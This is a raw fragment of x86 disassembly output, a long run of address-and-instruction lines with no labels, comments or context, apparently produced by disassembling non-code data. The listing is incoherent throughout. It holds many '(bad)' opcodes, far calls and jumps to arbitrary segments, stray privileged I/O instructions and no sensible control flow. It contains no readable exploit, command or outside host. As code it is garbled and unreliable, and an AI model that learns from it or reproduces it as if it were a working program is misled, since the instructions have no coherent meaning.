  41cdbb:	iret   
  41cdbc:	mov    dh,BYTE PTR [ebx-0xa]
  41cdbf:	ds cmc 
  41cdc1:	lds    edx,FWORD PTR ds:0x643bf0a
  41cdc7:	and    ch,BYTE PTR [edi+0x7c]
  41cdca:	sub    BYTE PTR gs:[edx-0x1d],dh
  41cdce:	adc    ecx,DWORD PTR [esi+0x76]
  41cdd1:	lahf   
  41cdd2:	cmp    cl,0x7e
  41cdd5:	dec    esp
  41cdd6:	(bad)  
  41cdd7:	aam    0xc5
  41cdd9:	loope  0x41ce20
  41cddb:	addr16 mov al,0xbe
  41cdde:	or     eax,0x8948fc14
  41cde3:	mov    ds:0x202246cd,al
  41cde8:	ins    DWORD PTR es:[edi],dx
  41cde9:	call   0xfbb0:0x14e50d7d
  41cdf0:	sub    eax,0xdd4b86f0
  41cdf5:	cmp    BYTE PTR [ebx-0x36],ch
  41cdf8:	and    esp,DWORD PTR [ebp+0x0]
  41cdfb:	inc    edi
  41cdfc:	lods   eax,DWORD PTR ds:[esi]
  41cdfd:	and    BYTE PTR [eax+ebp*1],ch
  41ce00:	jne    0x41ce73
  41ce02:	loopne 0x41ce06
  41ce04:	xor    eax,0xeb2758f
  41ce09:	sbb    eax,0xca4cde0b
  41ce0e:	adc    al,0x8f
  41ce10:	sub    eax,0x1dab020b
  41ce15:	std    
  41ce16:	jecxz  0x41cdfb
  41ce18:	sub    al,0x8d
  41ce1a:	ss loope 0x41ce64
  41ce1d:	sub    ch,0x68
  41ce20:	cmc    
  41ce21:	je     0x41ce41
  41ce23:	test   ecx,ebx
  41ce25:	mov    eax,0x239f7238
  41ce2a:	sahf   
  41ce2b:	mov    cl,0x55
  41ce2d:	in     al,0x1a
  41ce2f:	out    dx,eax
  41ce30:	xor    al,0x55
  41ce32:	dec    ebx
  41ce33:	and    eax,0x9ac0bf51
  41ce38:	les    edx,FWORD PTR [esi+0x3ac43694]
  41ce3e:	sahf   
  41ce3f:	sbb    BYTE PTR [edx+0x4a],cl
  41ce42:	enter  0x30ed,0xc2
  41ce46:	push   esp
  41ce47:	daa    
  41ce48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce49:	hlt    
  41ce4a:	inc    eax
  41ce4b:	les    esp,FWORD PTR [ecx]
  41ce4d:	fsub   QWORD PTR [ebp-0x61]
  41ce50:	(bad)  
  41ce51:	adc    dh,dl
  41ce53:	dec    esp
  41ce54:	lock mov eax,ds:0x68f75257
  41ce5a:	adc    eax,0x38fd036e
  41ce5f:	iret   
  41ce60:	add    dh,BYTE PTR [ebp+0x4ec25a0b]
  41ce66:	pop    ecx
  41ce67:	loop   0x41ce8f
  41ce69:	loope  0x41ce44
  41ce6b:	sub    ebx,DWORD PTR [ebx+ebx*2-0x251a50a4]
  41ce72:	int    0x2d
  41ce74:	stos   DWORD PTR es:[edi],eax
  41ce75:	sub    bh,ah
  41ce77:	leave  
  41ce78:	into   
  41ce79:	inc    eax
  41ce7a:	xor    al,0xf4
  41ce7c:	sar    BYTE PTR [ebp-0x558acad5],0xe7
  41ce83:	xchg   ecx,eax
  41ce84:	inc    ecx
  41ce85:	into   
  41ce86:	imul   eax,esp,0x45
  41ce89:	es clc 
  41ce8b:	cdq    
  41ce8c:	inc    edx
  41ce8d:	shr    BYTE PTR [eax],1
  41ce8f:	push   ss
  41ce90:	push   0xa
  41ce92:	stc    
  41ce93:	inc    ecx
  41ce94:	pop    eax
  41ce95:	adc    al,0x40
  41ce97:	dec    edx
  41ce98:	pop    es
  41ce99:	mov    cl,0x1d
  41ce9b:	popa   
  41ce9c:	lods   al,BYTE PTR ds:[esi]
  41ce9d:	cmp    ah,bl
  41ce9f:	cli    
  41cea0:	and    eax,0x8eda748a
  41cea5:	jl     0x41cf22
  41cea7:	or     edx,eax
  41cea9:	push   esp
  41ceaa:	lea    esp,[ecx+eax*4]
  41cead:	stos   BYTE PTR es:[edi],al
  41ceae:	(bad)  
  41ceaf:	rcr    DWORD PTR [ecx],1
  41ceb1:	sbb    BYTE PTR [edi+eiz*8],dl
  41ceb4:	not    cl
  41ceb6:	push   ecx
  41ceb7:	scas   eax,DWORD PTR es:[edi]
  41ceb8:	adc    DWORD PTR [edi],ecx
  41ceba:	or     al,0xa
  41cebc:	or     BYTE PTR [esi-0x48],bh
  41cebf:	cli    
  41cec0:	dec    ecx
  41cec1:	xchg   DWORD PTR [ebx-0x6be760a4],ebp
  41cec7:	cwde   
  41cec8:	pop    edi
  41cec9:	pop    edi
  41ceca:	pusha  
  41cecb:	dec    esi
  41cecc:	shr    dl,1
  41cece:	xor    DWORD PTR [edi+eax*1],eax
  41ced1:	aad    0xf8
  41ced3:	aas    
  41ced4:	cs sahf 
  41ced6:	mov    ds,WORD PTR [ecx]
  41ced8:	and    bl,bh
  41ceda:	pop    eax
  41cedb:	cli    
  41cedc:	js     0x41cee4
  41cede:	shl    BYTE PTR [edx],0x2
  41cee1:	xor    al,0xb9
  41cee3:	mov    ecx,DWORD PTR [ebx+0x4e1fa95e]
  41cee9:	sub    DWORD PTR [eax-0x7],edx
  41ceec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceed:	mov    ebx,DWORD PTR [ebx-0x763e8428]
  41cef3:	and    BYTE PTR [esi+0x4b],ch
  41cef6:	xchg   ebp,eax
  41cef7:	outs   dx,DWORD PTR ds:[esi]
  41cef8:	test   BYTE PTR [eax+edi*8+0x375e6b63],al
  41ceff:	cmc    
  41cf00:	mov    ebx,0xfb4a71b
  41cf05:	out    0xc3,al
  41cf07:	and    DWORD PTR [eax-0x4e43fe23],edi
  41cf0d:	cmp    DWORD PTR [ecx],ebx
  41cf0f:	pop    eax
  41cf10:	jle    0x41cf17
  41cf12:	dec    ebp
  41cf13:	and    dh,BYTE PTR [edi]
  41cf15:	fnstenv [eax+0x5f]
  41cf18:	jbe    0x41cf46
  41cf1a:	call   0x94b4:0xd10106e3
  41cf21:	adc    BYTE PTR [esi+0x6e8f3f90],0x13
  41cf28:	cmp    ecx,esi
  41cf2a:	adc    bh,0xc6
  41cf2d:	ins    BYTE PTR es:[edi],dx
  41cf2e:	and    DWORD PTR [eax-0x6d3bedec],ebp
  41cf34:	bound  esi,QWORD PTR [esi+esi*4+0x6dd64ccf]
  41cf3b:	dec    ebx
  41cf3c:	fbld   TBYTE PTR [edx-0x7f]
  41cf3f:	mov    ah,BYTE PTR [ecx-0x40]
  41cf42:	adc    BYTE PTR [ecx-0x19],ah
  41cf45:	cmp    cl,al
  41cf47:	stc    
  41cf48:	lds    edi,FWORD PTR [ebp-0x4]
  41cf4b:	add    dh,BYTE PTR [edi]
  41cf4d:	mov    dh,0x54
  41cf4f:	repnz mov esp,DWORD PTR ds:0xd4f7e1e0
  41cf56:	mov    ecx,0x32ae5bb6
  41cf5b:	es popf 
  41cf5d:	fs inc ebp
  41cf5f:	in     al,dx
  41cf60:	(bad)  
  41cf61:	inc    edi
  41cf62:	jo     0x41cf0f
  41cf64:	dec    ecx
  41cf65:	nop
  41cf66:	out    0x72,al
  41cf68:	inc    edx
  41cf69:	fld    QWORD PTR [esi-0x3f44d06e]
  41cf6f:	cmp    eax,0x4216b65a
  41cf74:	dec    edx
  41cf75:	xor    edi,edx
  41cf77:	addr16 cmc 
  41cf79:	or     esi,ecx
  41cf7b:	jp     0x41cfe4
  41cf7d:	loopne 0x41cfa5
  41cf7f:	push   esp
  41cf80:	pop    es
  41cf81:	dec    edx
  41cf82:	imul   esp,DWORD PTR [ebx],0x4a
  41cf85:	or     al,0x75
  41cf87:	xchg   esp,eax
  41cf88:	dec    edx
  41cf89:	xlat   BYTE PTR ds:[ebx]
  41cf8a:	inc    esp
  41cf8b:	adc    dl,ah
  41cf8d:	ins    BYTE PTR es:[edi],dx
  41cf8e:	push   0xfe4af4ec
  41cf93:	and    BYTE PTR [eax-0xd],dh
  41cf96:	rcl    DWORD PTR [edx-0x70],1
  41cf99:	sti    
  41cf9a:	out    0x39,eax
  41cf9c:	cdq    
  41cf9d:	and    DWORD PTR [esi+0x7b],eax
  41cfa0:	pop    eax
  41cfa1:	adc    eax,0x26c0988
  41cfa6:	outs   dx,BYTE PTR ds:[esi]
  41cfa7:	adc    al,0x34
  41cfa9:	pop    edx
  41cfaa:	adc    eax,esi
  41cfac:	gs ret 0xa9f5
  41cfb0:	sub    bl,cl
  41cfb2:	xchg   edi,eax
  41cfb3:	ret    0x395d
  41cfb6:	(bad)  
  41cfb7:	xchg   edx,eax
  41cfb8:	mov    ebx,0x4c30f7d9
  41cfbd:	leave  
  41cfbe:	mov    dl,0xa2
  41cfc0:	data16 mov bh,0x50
  41cfc3:	sub    eax,DWORD PTR [edx+0x45]
  41cfc6:	ret    
  41cfc7:	ds inc ecx
  41cfc9:	pop    ss
  41cfca:	test   al,0x68
  41cfcc:	or     al,0xd1
  41cfce:	pop    ss
  41cfcf:	outs   dx,DWORD PTR ds:[esi]
  41cfd0:	icebp  
  41cfd1:	sbb    al,0xe5
  41cfd3:	lods   eax,DWORD PTR ds:[esi]
  41cfd4:	push   esp
  41cfd5:	icebp  
  41cfd6:	pop    ecx
  41cfd7:	cmp    ch,BYTE PTR [esi-0x71]
  41cfda:	push   ebx
  41cfdb:	cmp    al,0x13
  41cfdd:	mov    dl,0xdf
  41cfdf:	mov    bl,al
  41cfe1:	dec    DWORD PTR [esi]
  41cfe3:	push   ss
  41cfe4:	ss fs (bad) 
  41cfe7:	(bad)  
  41cfe8:	bound  eax,QWORD PTR ds:0xec6e9e44
  41cfee:	repnz test DWORD PTR [edi-0x38],ecx
  41cff2:	adc    al,0xa0
  41cff4:	jno    0x41cf89
  41cff6:	xor    al,0xee
  41cff8:	or     BYTE PTR [ecx-0x67aea082],bl
  41cffe:	mov    DWORD PTR [ebx-0x6dad0fd8],edi
  41d004:	fisub  WORD PTR [ecx]
  41d006:	arpl   WORD PTR [ecx-0x55],bx
  41d009:	and    al,0x9c
  41d00b:	dec    esi
  41d00c:	aas    
  41d00d:	call   0x71d32dd6
  41d012:	call   0xc954:0x9a292ac4
  41d019:	mov    ah,0xbf
  41d01b:	ja     0x41cfa9
  41d01d:	fdiv   st(3),st
  41d01f:	push   es
  41d020:	sub    ebx,eax
  41d022:	add    eax,0x138fbb8c
  41d027:	sub    dl,BYTE PTR [esi]
  41d029:	cwde   
  41d02a:	pushf  
  41d02b:	outs   dx,DWORD PTR ds:[esi]
  41d02c:	add    cl,BYTE PTR [eax-0x594586c9]
  41d032:	push   esp
  41d033:	popa   
  41d034:	lds    ebp,FWORD PTR [esi-0x41a73e22]
  41d03a:	ret    
  41d03b:	aam    0x94
  41d03d:	fcomp  st(7)
  41d03f:	shl    ebp,0x35
  41d042:	jo     0x41cfc7
  41d044:	hlt    
  41d045:	data16 and BYTE PTR [esp+edx*2-0x52d7d32a],0x79
  41d04e:	mov    ebx,0xa051710
  41d053:	mov    BYTE PTR [edi+0x6e],dl
  41d056:	push   0x7
  41d058:	sub    eax,0x214789d3
  41d05d:	into   
  41d05e:	or     bl,BYTE PTR [edx+0x1f65dab6]
  41d064:	xchg   edx,eax
  41d065:	sti    
  41d066:	imul   edx,DWORD PTR [ebx],0xb7ec4bf8
  41d06c:	pusha  
  41d06d:	sub    al,0x25
  41d06f:	xor    eax,0x3ccbdda1
  41d074:	and    al,0x3
  41d076:	xchg   edx,eax
  41d077:	sbb    esi,ecx
  41d079:	aas    
  41d07a:	mov    ds:0x94950757,al
  41d07f:	jmp    DWORD PTR [ecx-0x3e4094bf]
  41d085:	call   FWORD PTR [ecx-0x4e320ff]
  41d08b:	lock arpl WORD PTR [ebx+0x7a],dx
  41d08f:	jo     0x41d061
  41d091:	jo     0x41d01a
  41d093:	arpl   cx,bx
  41d095:	sub    BYTE PTR [edi-0x1c],bl
  41d098:	cmp    dl,al
  41d09a:	iret   
  41d09b:	js     0x41d02a
  41d09d:	lahf   
  41d09e:	xchg   esi,eax
  41d09f:	arpl   WORD PTR [esi],bp
  41d0a1:	sbb    al,0x61
  41d0a3:	fadd   QWORD PTR [eax+0x12]
  41d0a6:	jae    0x41d0fd
  41d0a8:	jmp    0x41d050
  41d0aa:	call   0x3479:0x7251826e
  41d0b1:	xchg   dh,bh
  41d0b3:	lods   eax,DWORD PTR ds:[esi]
  41d0b4:	push   ss
  41d0b5:	add    ebp,DWORD PTR [ebx+0xdcca79]
  41d0bb:	ret    0x7d51
  41d0be:	cmp    ebp,DWORD PTR [ebx-0x6f]
  41d0c1:	adc    cl,BYTE PTR [edi-0x684d02fe]
  41d0c7:	shl    BYTE PTR [esi+ebx*1],cl
  41d0ca:	push   eax
  41d0cb:	xor    al,0x8
  41d0cd:	mov    al,0x8f
  41d0cf:	sbb    dh,BYTE PTR [esi]
  41d0d1:	imul   edx,DWORD PTR [eax-0x18abc814],0x938682df
  41d0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0dc:	bound  esi,QWORD PTR [esi]
  41d0de:	lds    ebx,FWORD PTR [eax+0x64d7d74]
  41d0e4:	dec    ebx
  41d0e5:	ja     0x41d157
  41d0e7:	in     al,0x9a
  41d0e9:	icebp  
  41d0ea:	imul   esp,ebp,0xffffffeb
  41d0ed:	xchg   ebx,eax
  41d0ee:	mov    eax,0x8ac05ad3
  41d0f3:	jp     0x41d09f
  41d0f5:	nop
  41d0f6:	add    cl,BYTE PTR [eax+0x75a01d0c]
  41d0fc:	fs inc esi
  41d0fe:	test   BYTE PTR [ebx-0x8e61f07],cl
  41d104:	shr    BYTE PTR [ebp+ecx*2+0x36],1
  41d108:	ja     0x41d13c
  41d10a:	jmp    0xf70c:0x31b96709
  41d111:	jmp    0x8dd4:0xf5c3e2fb
  41d118:	xchg   ebp,eax
  41d119:	loope  0x41d0ce
  41d11b:	rcr    BYTE PTR [esi],cl
  41d11d:	pop    ebx
  41d11f:	push   es
  41d120:	in     eax,dx
  41d121:	and    BYTE PTR [eax+0x5b],0xb0
  41d125:	mov    al,ds:0x9ba8e727
  41d12a:	xor    BYTE PTR [ecx],dl
  41d12c:	push   esp
  41d12d:	outs   dx,BYTE PTR ds:[esi]
  41d12e:	xchg   DWORD PTR fs:[ecx-0x6e],esi
  41d132:	and    esi,DWORD PTR [esi]
  41d134:	daa    
  41d135:	adc    eax,DWORD PTR [edi+0x3f07c44e]
  41d13b:	cmp    al,0xb4
  41d13d:	jmp    0xf2cb333e
  41d142:	xchg   ebx,eax
  41d143:	dec    edx
  41d144:	mov    cs,WORD PTR [edx]
  41d146:	mov    dh,BYTE PTR [eax+0x57]
  41d149:	push   cs
  41d14a:	push   ecx
  41d14b:	aad    0xc6
  41d14d:	cmp    al,0x6
  41d14f:	mov    ah,0x1f
  41d151:	inc    ecx
  41d152:	(bad)  
  41d156:	jmp    0x289cfdc1
  41d15b:	maskmovq mm3,(bad)
  41d15c:	neg    DWORD PTR [ebx]
  41d15e:	sbb    al,0x5e
  41d160:	inc    ebx
  41d161:	cmp    al,dh
  41d163:	xchg   edx,eax
  41d164:	cwde   
  41d165:	sbb    esi,ebp
  41d167:	out    0x88,eax
  41d169:	js     0x41d1a3
  41d16b:	xchg   esp,eax
  41d16c:	imul   edi,edx,0xffffffd1
  41d16f:	mov    eax,es:0x2a9c54
  41d175:	jb     0x41d1f1
  41d177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d178:	adc    DWORD PTR [ebp+0xca25636],ecx
  41d17e:	test   DWORD PTR [esi-0x17d42f1f],ebx
  41d184:	pop    esi
  41d185:	ins    BYTE PTR es:[edi],dx
  41d186:	jg     0x41d13c
  41d188:	loop   0x41d188
  41d18a:	push   edx
  41d18b:	out    dx,al
  41d18c:	xor    al,0xf8
  41d18e:	enter  0xf844,0x7a
  41d192:	loopne 0x41d19b
  41d194:	mov    eax,ds:0x5069d13a
  41d199:	cwd    
  41d19b:	into   
  41d19c:	inc    dl
  41d19e:	stos   BYTE PTR es:[edi],al
  41d19f:	in     eax,dx
  41d1a0:	nop
  41d1a1:	cdq    
  41d1a2:	mov    ebx,0x92c5abf8
  41d1a7:	sahf   
  41d1a8:	ficom  DWORD PTR [ebx]
  41d1aa:	jge    0x41d1a6
  41d1ac:	ret    
  41d1ad:	mov    DWORD PTR [edi+edi*4-0x31c115e0],esi
  41d1b4:	data16 sub al,0x78
  41d1b7:	push   ds
  41d1b8:	out    dx,eax
  41d1b9:	push   ss
  41d1ba:	and    edi,ebp
  41d1bc:	mov    WORD PTR [ebp+0x57c9ef55],ss
  41d1c2:	ret    
  41d1c3:	inc    esp
  41d1c4:	mov    BYTE PTR [ecx+ebx*2],bh
  41d1c7:	mov    ah,0xe1
  41d1c9:	push   ebp
  41d1ca:	mov    bh,0x43
  41d1cc:	ss scas al,BYTE PTR es:[edi]
  41d1ce:	stc    
  41d1cf:	pop    ecx
  41d1d0:	jp     0x41d1f2
  41d1d2:	fsub   DWORD PTR [ebp+edx*4+0x2fe1c6ca]
  41d1d9:	ss ret 0x3fa4
  41d1dd:	xchg   DWORD PTR [ebp+0x2a],ebx
  41d1e0:	dec    esi
  41d1e1:	lahf   
  41d1e2:	or     eax,0x99aecf93
  41d1e7:	fs scas eax,DWORD PTR es:[edi]
  41d1e9:	mov    edi,0xd78b3acb
  41d1ee:	out    0xda,eax
  41d1f0:	dec    edi
  41d1f1:	jp     0x41d20e
  41d1f3:	lods   eax,DWORD PTR ds:[esi]
  41d1f4:	cmp    edx,ecx
  41d1f6:	or     edi,DWORD PTR [esi-0x53]
  41d1f9:	mov    esi,DWORD PTR [ebx+eiz*4+0x71]
  41d1fd:	popf   
  41d1fe:	xlat   BYTE PTR ds:[ebx]
  41d1ff:	mov    DWORD PTR ds:0x6e647578,edi
  41d205:	mov    ebx,0x5aea7bc5
  41d20a:	in     eax,dx
  41d20b:	inc    eax
  41d20c:	push   ebp
  41d20d:	sbb    ebx,ecx
  41d20f:	out    dx,al
  41d210:	push   edi
  41d211:	bound  edi,QWORD PTR [ebx+0xdfc1f1a]
  41d217:	cmp    al,0x99
  41d219:	jecxz  0x41d1d8
  41d21b:	cmp    ebp,DWORD PTR [edi+0x3d433c1e]
  41d221:	inc    esi
  41d222:	jmp    0xd64fe6ab
  41d227:	cmp    BYTE PTR [ebx],ah
  41d229:	mov    dl,0x4
  41d22b:	xor    esp,esp
  41d22d:	out    dx,eax
  41d22e:	adc    DWORD PTR [esi+ebx*8+0x73854f7],esp
  41d235:	xor    ecx,0xfffffff2
  41d238:	dec    ecx
  41d239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d23a:	inc    ebp
  41d23b:	(bad)  
  41d23c:	and    BYTE PTR [edx+0x62],0xca
  41d240:	mov    dl,0xfd
  41d242:	xchg   DWORD PTR [esp+eiz*8],edx
  41d245:	sub    al,BYTE PTR [edx-0x71]
  41d248:	inc    edi
  41d249:	int3   
  41d24a:	pop    esp
  41d24b:	sub    ah,BYTE PTR [ebp+0x7cc31264]
  41d251:	jae    0x41d262
  41d253:	and    al,0xfb
  41d255:	outs   dx,DWORD PTR ds:[esi]
  41d256:	popa   
  41d257:	xchg   DWORD PTR [ebx-0x4f],edx
  41d25a:	pop    ss
  41d25b:	xor    dl,al
  41d25d:	jb     0x41d1ef
  41d25f:	fimul  WORD PTR [eax+0x14]
  41d262:	mov    bh,0x68
  41d264:	test   al,0x87
  41d266:	xchg   ebx,eax
  41d267:	fst    DWORD PTR [esi]
  41d269:	div    BYTE PTR [ecx+0x3]
  41d26c:	loop   0x41d25f
  41d26e:	push   ebx
  41d26f:	(bad)  
  41d270:	aas    
  41d271:	xchg   ecx,eax
  41d272:	sub    DWORD PTR [edi-0x36afbb2],edi
  41d278:	mov    eax,ds:0x27629776
  41d27d:	nop
  41d27e:	push   edx
  41d27f:	rol    BYTE PTR [ecx-0x16b3442e],cl
  41d285:	fsubrp st(3),st
  41d287:	enter  0x1f26,0xf9
  41d28b:	mul    BYTE PTR [edx-0x35]
  41d28e:	and    eax,0xc1675ef4
  41d293:	in     al,0x81
  41d295:	sbb    cl,0x69
  41d298:	xor    esp,DWORD PTR [ebx]
  41d29a:	jl     0x41d263
  41d29c:	lods   al,BYTE PTR ds:[esi]
  41d29d:	mov    dh,0x7b
  41d29f:	stc    
  41d2a0:	out    dx,al
  41d2a1:	cdq    
  41d2a2:	mov    esi,DWORD PTR [eax+0x72]
  41d2a5:	push   eax
  41d2a6:	pop    esp
  41d2a7:	bnd ret 0xe086
  41d2ab:	xchg   ecx,eax
  41d2ac:	dec    esp
  41d2ad:	or     DWORD PTR ds:[esi-0x4a6c41e0],0x55
  41d2b5:	mov    BYTE PTR [ebp-0x1459af27],ah
  41d2bb:	call   0xc2c280d3
  41d2c0:	bound  ebp,QWORD PTR [esi+0x404ff20e]
  41d2c6:	addr16 mov ebp,0x38c1380c
  41d2cc:	hlt    
  41d2cd:	jecxz  0x41d324
  41d2cf:	mov    bl,0x75
  41d2d1:	push   0xffffffc2
  41d2d3:	loop   0x41d30e
  41d2d5:	xor    ebx,esp
  41d2d7:	pushf  
  41d2d8:	nop
  41d2d9:	sub    edi,ebx
  41d2db:	popf   
  41d2dc:	mov    bl,0x71
  41d2de:	push   ds
  41d2df:	jmp    0x41d278
  41d2e1:	jnp    0x41d316
  41d2e3:	fstp   DWORD PTR [eax+0x31609ea]
  41d2e9:	jno    0x41d31e
  41d2eb:	mov    edx,0x42c9838d
  41d2f0:	fmulp  st(0),st
  41d2f2:	lods   al,BYTE PTR ds:[esi]
  41d2f3:	out    0xd7,al
  41d2f5:	in     eax,0xe0
  41d2f7:	pop    esi
  41d2f8:	mov    al,ds:0x2910f6f7
  41d2fd:	dec    esi
  41d2fe:	add    eax,0xce776e97
  41d303:	icebp  
  41d304:	inc    edx
  41d305:	lods   eax,DWORD PTR ds:[esi]
  41d306:	mov    eax,0x8b893e9b
  41d30b:	fwait
  41d30c:	sbb    edx,DWORD PTR ss:[edx-0x3a68d223]
  41d313:	test   DWORD PTR [ecx+0xd],eax
  41d316:	out    0x47,eax
  41d318:	imul   eax,ebx,0x729d62bb
  41d31e:	fidivr WORD PTR [edx]
  41d320:	(bad)  
  41d321:	movd   DWORD PTR [ebp+0x66],mm0
  41d325:	loope  0x41d3a5
  41d327:	push   ecx
  41d328:	lods   al,BYTE PTR ds:[esi]
  41d329:	jl     0x41d2cb
  41d32b:	add    al,0xc8
  41d32d:	inc    ecx
  41d32e:	bound  edi,QWORD PTR ds:0x265ef74a
  41d334:	inc    eax
  41d335:	iret   
  41d336:	sbb    DWORD PTR [eax+0x596f1a93],0xffffffb5
  41d33d:	lods   al,BYTE PTR ds:[esi]
  41d33e:	mov    ah,0xfc
  41d340:	out    dx,al
  41d341:	inc    edx
  41d342:	or     eax,0xc4d1f229
  41d347:	dec    esp
  41d348:	xchg   esi,eax
  41d349:	mov    DWORD PTR [ecx+ebx*2],0x295c1c67
  41d350:	and    al,0xe5
  41d352:	or     al,0x4d
  41d354:	adc    bl,BYTE PTR ds:[edi+0x54]
  41d358:	cmp    eax,0xc9a194a9
  41d35d:	or     ch,bh
  41d35f:	cmp    ebx,DWORD PTR [ecx-0x6382ceaf]
  41d365:	test   DWORD PTR [eax+0xa167594],0x64e65abf
  41d36f:	icebp  
  41d370:	mov    al,0x88
  41d372:	inc    edi
  41d373:	sbb    DWORD PTR [esi-0x3e],ebp
  41d376:	shl    bl,cl
  41d378:	cdq    
  41d379:	popa   
  41d37a:	shl    DWORD PTR ds:0xaaa37db1,cl
  41d380:	or     ecx,DWORD PTR [edi]
  41d382:	pop    ds
  41d383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d384:	and    eax,0xc4e8835
  41d389:	mov    ds:0xfaa55f6d,al
  41d38e:	in     al,dx
  41d38f:	xchg   esp,eax
  41d390:	and    bl,bl
  41d392:	inc    ebx
  41d393:	leave  
  41d394:	in     al,dx
  41d395:	loopne 0x41d365
  41d397:	es jo  0x41d343
  41d39a:	cmp    ebx,ebp
  41d39c:	sub    al,0x93
  41d39e:	mov    edx,0x4727f454
  41d3a3:	xor    al,0x3d
  41d3a5:	ds loopne 0x41d3af
  41d3a8:	pop    ebp
  41d3a9:	lock sbb edi,ebx
  41d3ac:	xchg   ebp,eax
  41d3ad:	mov    ebx,0x4fbd5fca
  41d3b2:	add    BYTE PTR [edx+0x68bfa6a3],cl
  41d3b8:	xchg   BYTE PTR [eax],dl
  41d3ba:	push   esi
  41d3bb:	ss js  0x41d423
  41d3be:	pop    edx
  41d3bf:	rcr    DWORD PTR [edi-0x3e347e07],1
  41d3c5:	popf   
  41d3c6:	push   cs
  41d3c7:	in     al,dx
  41d3c8:	pop    esi
  41d3c9:	sbb    DWORD PTR [edi],ecx
  41d3cb:	cwde   
  41d3cc:	jo     0x41d370
  41d3ce:	dec    esp
  41d3cf:	ins    BYTE PTR es:[edi],dx
  41d3d0:	aas    
  41d3d1:	dec    ebx
  41d3d2:	pop    edx
  41d3d3:	add    al,0x2f
  41d3d5:	lods   eax,DWORD PTR ds:[esi]
  41d3d6:	inc    esi
  41d3d7:	dec    ebp
  41d3d8:	mov    eax,ecx
  41d3da:	cmp    al,dh
  41d3dc:	(bad)  [eax+0x60]
  41d3df:	jns    0x41d416
  41d3e1:	and    ebp,0xfffffff8
  41d3e4:	loope  0x41d3a2
  41d3e6:	stos   BYTE PTR es:[edi],al
  41d3e7:	sbb    ebp,edx
  41d3e9:	imul   edx,DWORD PTR [eax+0x70],0x1874ef74
  41d3f0:	pop    esi
  41d3f1:	xor    eax,0xc251ecc7
  41d3f6:	adc    esp,eax
  41d3f8:	mov    WORD PTR [ebx+0x4933ecb8],ss
  41d3fe:	cmc    
  41d3ff:	jge    0x41d3f2
  41d401:	xor    BYTE PTR [esi+0x574b3539],ch
  41d407:	adc    DWORD PTR [ebx],ecx
  41d409:	loopne 0x41d47c
  41d40b:	pusha  
  41d40c:	inc    esi
  41d40d:	call   0x765b:0x20e7a4af
  41d414:	pop    ecx
  41d415:	mov    edx,edx
  41d417:	or     eax,0x34f95ef7
  41d41c:	or     al,BYTE PTR [edx+0x23]
  41d41f:	mov    ch,0xf6
  41d421:	loop   0x41d3a9
  41d423:	xchg   esi,eax
  41d424:	lds    ebp,FWORD PTR [esi+0x2f]
  41d427:	jae    0x41d47d
  41d429:	sbb    BYTE PTR [edi],cl
  41d42b:	pop    esi
  41d42c:	or     DWORD PTR [esi],edi
  41d42e:	mov    ds:0xe343f12a,al
  41d433:	jns    0x41d4ae
  41d435:	pop    esp
  41d436:	pop    es
  41d437:	mov    cs,WORD PTR [ebx-0x6c]
  41d43a:	mov    ds:0x69bddfdc,eax
  41d43f:	icebp  
  41d440:	mov    ds:0xe614e691,eax
  41d445:	arpl   WORD PTR [ebx],si
  41d447:	cmp    edi,DWORD PTR [esi]
  41d449:	jnp    0x41d4b8
  41d44b:	and    esp,DWORD PTR [ecx]
  41d44d:	out    0x1e,al
  41d44f:	xor    eax,0xbcbf8c3a
  41d454:	jno    0x41d3db
  41d456:	add    BYTE PTR ds:0xae6e3f4f,cl
  41d45c:	xchg   ebp,eax
  41d45d:	pop    edi
  41d45e:	push   ecx
  41d45f:	cmp    eax,0x4f0b5f51
  41d464:	fs sbb eax,0x5b009b48
  41d46a:	mov    edi,0x148ada80
  41d46f:	ror    esi,1
  41d471:	imul   esp,DWORD PTR [ebp+0x6e4c57a],0x91e19f5b
  41d47b:	dec    eax
  41d47c:	scas   al,BYTE PTR es:[edi]
  41d47d:	inc    esp
  41d47e:	or     BYTE PTR [edx+0x1b4ba3ee],bh
  41d484:	xchg   dl,ah
  41d486:	icebp  
  41d487:	icebp  
  41d488:	jb     0x41d4fe
  41d48a:	out    dx,al
  41d48b:	test   DWORD PTR [edi],ebx
  41d48d:	mov    eax,ds:0xb837cfa1
  41d492:	(bad)  [ecx-0x2a]
  41d495:	je     0x41d41d
  41d497:	aaa    
  41d498:	xchg   DWORD PTR [ecx+edi*1],ebp
  41d49b:	dec    esi
  41d49c:	sbb    cl,dh
  41d49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d49f:	gs sbb al,0x27
  41d4a2:	sbb    BYTE PTR [edi-0xc],cl
  41d4a5:	cmp    al,BYTE PTR [eax+0x62]
  41d4a8:	jge    0x41d4d6
  41d4aa:	push   edi
  41d4ab:	leave  
  41d4ac:	adc    al,0xb4
  41d4ae:	fdivr  DWORD PTR [edx-0x64]
  41d4b1:	jo     0x41d433
  41d4b3:	adc    bl,BYTE PTR [ebx+0x5474df4b]
  41d4b9:	shr    DWORD PTR [esi],1
  41d4bb:	inc    ecx
  41d4bc:	push   eax
  41d4bd:	cmp    DWORD PTR ds:0x88e39e77,edi
  41d4c3:	popf   
  41d4c4:	add    ah,BYTE PTR [edx+0x277ea114]
  41d4ca:	mov    ds:0x58534e45,eax
  41d4cf:	pushf  
  41d4d0:	call   0xb19:0x9314c089
  41d4d7:	mov    eax,0xb0c5682d
  41d4dc:	ret    
  41d4dd:	and    BYTE PTR [ecx-0x2a],0x52
  41d4e1:	aad    0xc5
  41d4e3:	adc    BYTE PTR [edx+0x286264a6],dh
  41d4e9:	repnz xchg edi,eax
  41d4eb:	(bad)  
  41d4ec:	sti    
  41d4ed:	xchg   esi,eax
  41d4ee:	dec    esi
  41d4ef:	add    edi,DWORD PTR [ebx+ecx*1-0x72]
  41d4f3:	jmp    0xb5f9:0xccee2ef9
  41d4fa:	enter  0x693b,0x89
  41d4fe:	jge    0x41d488
  41d500:	jb     0x41d49f
  41d502:	sub    eax,0x99893c72
  41d507:	out    dx,eax
  41d508:	mov    DWORD PTR [ebp+0x13104eb2],eax
  41d50e:	xchg   ebx,eax
  41d50f:	xchg   ecx,eax
  41d510:	pop    edi
